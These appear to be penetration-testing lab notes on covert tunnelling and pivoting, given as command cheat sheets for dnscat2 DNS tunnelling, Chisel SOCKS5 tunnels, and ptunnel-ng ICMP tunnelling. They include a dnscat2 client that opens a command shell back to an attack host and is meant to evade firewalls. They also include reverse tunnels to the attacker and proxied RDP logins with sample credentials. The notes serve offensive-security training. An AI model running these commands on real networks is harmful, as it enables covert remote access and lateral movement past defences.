## DNS Tunneling with Dnscat2
```bash
# Dnscat2 is a tunneling tool that uses DNS protocol to send data between two hosts, evading firewall detections which strip the HTTPS connections and sniff the traffic. (https://github.com/iagox86/dnscat2)

## Starting the dnscat2 server on Attack host
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

## Cloning dnscat2-powershell and run it on the Windows target
git clone https://github.com/lukebaggett/dnscat2-powershell.git
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 

## Session Establishment on the  Attack Host
dnscat2> ? # help option
dnscat2> window -i 1 # drop a shell
```
## SOCKS5 Tunneling with Chisel
```bash
# Chisel can create a client-server tunnel connection in a firewall restricted environment.

# ATTACKER-> M1(10.129.202.64/172.16.X.X)-> M2(172.16.X.X) # dynamic port frw

## Normal mode 
  # on the pivot host (M1)
  ./chisel server -v -p 1234 --socks5

  # On Attacker Host 
  ./chisel client -v <M1-IP>:1234 socks #proxy: 127.0.0.1:1080=>socks: Listening
  
  tail -f /etc/proxychains.conf #=> socks5 127.0.0.1 1080
  proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 # pivoting work

## Reverse Mode (if blocks inbound connections)
   ### on our Attack Host
   sudo ./chisel server --reverse -v -p 1234 --socks5

   ### Connecting the Chisel Client to our Attack Host
   ./chisel client -v <ATTACKER-IP>:1234 R:socks

   proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 # pivoting work
```

## ICMP Tunneling with SOCKS
```bash
# ICMP tunneling encapsulates your traffic within ICMP packets containing echo requests and responses, (https://github.com/utoni/ptunnel-ng.git)
Attacker(10.129.x.x:)=ICMP(SSH)=> M1 (10.129.x.x:22)=SSH=> M1 (localhost:22)
# setup tool with static binery
sudo apt install automake autoconf -y
cd ptunnel-ng/
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh

# local port frw
  ## Starting the ptunnel-ng Server on the Target Host
  scp -r ptunnel-ng <M1-USER>@<M1-IP>:~/
  sudo ./ptunnel-ng -r<M1-IP> -R22

  ## Connecting to ptunnel-ng Server from Attack Host
  sudo ./ptunnel-ng -p<M1-IP> -l2222 -r<M1-ip> -R22

  ## On The Attack host Tunneling an SSH connection through an ICMP Tunnel
  ssh -p2222 -lubuntu 127.0.0.1

# enable Dynamic Port frw over ssh
  ssh -D 9050 -p2222 -lubuntu 127.0.0.1
  proxychains nmap -sV -sT 172.16.5.19 -p3389
```